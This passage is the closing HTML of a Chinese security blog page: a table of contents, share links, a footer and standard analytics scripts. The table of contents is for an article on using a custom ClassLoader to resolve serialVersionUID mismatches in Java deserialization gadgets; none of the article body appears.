+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-背景"><span class="toc-number">1.</span> <span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-各方案的优劣"><span class="toc-number">2.</span> <span class="toc-text">0x02 各方案的优劣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-自定义ClassLoader解决方案"><span class="toc-number">3.</span> <span class="toc-text">0x03 自定义ClassLoader解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-addClass-amp-amp-addJar"><span class="toc-number">4.</span> <span class="toc-text">0x04 addClass &amp;&amp; addJar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-改双亲委派为自定义ClassLoader优先"><span class="toc-number">5.</span> <span class="toc-text">0x05 改双亲委派为自定义ClassLoader优先</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-编写版本兼容gadget"><span class="toc-number">6.</span> <span class="toc-text">0x06 编写版本兼容gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考文章"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&text=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&is_video=false&description=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题&body=Check out this article: http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&name=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2017 ~ 2020 c0ny1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/gossip/">闲言碎语</a></li>
+         
+          <li><a href="/links/">左邻右舍</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+			  var hm = document.createElement("script");
+			  hm.src = "https://hm.baidu.com/hm.js?a50c39f542eebaf72e68c9ff51a854bc";
+			  var s = document.getElementsByTagName("script")[0]; 
+			  s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+
+
+	<script>
+		(function(){
+			var bp = document.createElement('script');
+			var curProtocol = window.location.protocol.split(':')[0];
+			if (curProtocol === 'https') {
+				bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+			}
+			else {
+				bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+			}
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(bp, s);
+		})();
+	</script>
+
+
+
+
+
+
+	<script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+	<script src="/js/fancybox.js"></script>
+	<link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
